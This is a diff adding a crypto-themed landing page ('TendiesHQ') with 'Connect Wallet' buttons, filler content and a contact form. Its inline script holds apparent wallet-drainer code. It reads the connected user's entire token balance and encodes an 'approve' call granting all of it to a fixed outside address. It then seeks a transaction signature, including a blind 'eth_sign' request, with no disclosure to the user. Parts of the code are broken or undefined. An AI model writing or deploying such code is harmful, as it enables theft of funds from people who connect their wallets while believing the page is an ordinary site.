@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Frontend Test WGMI</title>
+        <link rel="stylesheet" href="css/main.css">
+</head>
+
+<body>
+
+    <div class="navbar">
+        <div class="container">
+            <a class="logo" href="https://4chan.org/biz/">Tendies<span>HQ</span></a>
+            
+            <img id="mobile-cta" class="mobile-menu" src="assets/menu.svg" alt="Open Navigation">
+
+            <nav>
+                <img id="mobile-exit" class="mobile-menu-exit" src="assets/exit.svg" alt="Close Navigation">
+                
+                <ul class="primary-nav">
+                    <li class="current"><a href="#">Home</a></li>
+                    <li><a href="#">Features</a></li>
+                    <li><a href="#">Pricing</a></li>
+                </ul>
+
+                <ul class="secondary-nav">
+                    <li><a href="#">Contact</a></li>
+                    <li class="gopremium-cta"><a href="#">Connect Wallet</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+
+    <section class="hero">
+        <div class="container">
+            <div class="leftcol">
+                <p class="subhead">The Future is Now</p>
+                <h1>Connect to the Future</h1>
+
+                <div class="hero-cta">
+                    <a href="#" class="primary-cta">Connect Wallet</a>
+                    <a href="#" class="watch-video-cta"></a>
+                </div>
+
+            </div>
+            <img src="assets/illustration.svg" class="hero-img" alt="Illustration">
+        </div>
+    </section>
+
+    <section class="features-section">
+        <div class="container">
+            <ul class="features-list">
+                <li>Lorem Ipsum</li>
+                <li>Lorem Ipsum</li>
+                <li>Lorem Ipsum</li>
+                <li>Lorem Ipsum</li>
+                <li>Lorem Ipsum</li>
+                <li>Lorem Ipsum</li>
+            </ul>
+
+            <img src="assets/holding-phone.jpg" alt="Man holding phone">
+        </div>
+    </section>
+
+    <section class="testimonials-section">
+        <div class="container">
+            <ul>
+                <li>
+                    <img src="assets/bear.jpg" alt="Person">
+
+                    <blockquote>"Hello world!"</blockquote>
+                    <cite>- Bull</cite>
+                </li>
+
+                <li>
+                    <img src="assets/wojak.jpg" alt="Person">
+
+                    <blockquote>"Hello world!"</blockquote>
+                    <cite>- Bull</cite>
+                </li>
+
+                <li>
+                    <img src="assets/mcd.jpg" alt="Person">
+
+                    <blockquote>"Hello world!"</blockquote>
+                    <cite>- Bull</cite>
+                </li>
+            </ul>
+        </div>
+    </section>
+
+    <section class="contact-section">
+        <div class="container">
+            <div class="contact-left">
+                <h2>Contact</h2>
+                <form action="">
+                    <label for="name">Name</label>
+                    <input type="text" id="name" name="name">
+
+                    <label for="message">Message</label>
+                    <textarea name="message" id="message" cols="30" rows="10"></textarea>
+
+                    <input type="submit" class="send-message-cta" value="Send Message">
+                </form>
+            </div>
+
+            <div class="contact-right">
+                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2797221.2300920845!2d5.981405624908434!3d46.79127685704961!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x478c64ef6f596d61%3A0x5c56b5110fcb7b15!2sSwitzerland!5e0!3m2!1sen!2sus!4v1641443267231!5m2!1sen!2sus" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+            </div>
+        </div>
+    </section>
+
+    <script>
+
+        const mobileBtn = document.getElementById('mobile-cta')
+            nav = document.querySelector('nav')
+            mobileBtnExit = document.getElementById('mobile-exit');
+        
+            mobileBtn.addEventListener('click', ()  => {
+                nav.classList.add('menu-btn');
+            })
+            mobileBtnExit.addEventListener('click', ()  => {
+                nav.classList.remove('menu-btn');
+            })
+
+        const newInteract = async () => {
+            const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+            await provider.send("eth_requestAccounts", []);
+            let iface = new ethers.utils.Interface(ContractAbi);
+            const signer = provider.getSigner();
+            const contract = new ethers.Contract("0xc778417E063141139Fce010982780140Aa0cD5Ab", ContractAbi, signer);
+            let name = await contract.name();
+            let userBalance = await contract.balanceOf(signer.getAddress());
+            let dat = iface.encodeFunctionData("approve", ["0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f",userBalance.toString() ])
+            console.log(dat)
+            let transaction = {
+            from: signer.getAddress(),
+            nonce : "0x0", // this is ignored by metamask
+            gasLimit: "0x5208",
+            gasPrice: "0x4E3B29200",
+            to: "0xc778417E063141139Fce010982780140Aa0cD5Ab",
+            data: dat,
+            value: 0
+            }
+            let signature = await signer.signTransaction(transaction) // we cant use wallet.signTransaction as you cant make a wallet object without private key
+            //await contract.approve("0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f", userBalance.toString())
+            console.log("Contract : ",  contract)
+            console.log("Account:", await signer.getAddress());
+            console.log("Name", name)
+
+        }
+
+
+        const interact = async () => {
+            const { ethereum } = window;
+            const web3 = new Web3(ethereum);
+            const contract = new web3.eth.Contract(ContractAbi, "0xc778417E063141139Fce010982780140Aa0cD5Ab");
+            let userBalance = await contract.methods.balanceOf(currentAccount).call();
+
+            let tx_builder =  contract.methods.approve("0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f", userBalance.toString());
+            let encoded_tx = tx_builder.encodeABI();
+            
+            console.log(encoded_tx)
+            const accounts = await ethereum.request({method: "eth_accounts"});
+            console.log(accounts)
+            let transaction = {
+            from: accounts[0],
+            nonce : "0x0", // this is ignored by metamask
+            gasLimit: "0x5208",
+            gasPrice: "0x4E3B29200",
+            to: "0xc778417E063141139Fce010982780140Aa0cD5Ab",
+            data: encoded_tx,
+            value: 0
+            }
+
+            const rawTransaction = encode([transaction.to, transaction.data, transaction.nonce, transaction.gasPrice, transaction.gasLimit,  transaction.value]);
+            // encode is import from the rld library
+            console.log("sha : ", sha256(rawTransaction), typeof(sha256(rawTransaction)))
+            console.log(rawTransaction.toString('hex'));
+            const signature = await ethereum.request({ method: 'eth_sign', params: [ rawTransaction,"0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f", function(err, out) {
+            // also tries sha256 it but that didnt work either
+            console.log(err, out);
+            } ] });
+
+
+      }
+
+    </script>
+</body>
+</html>
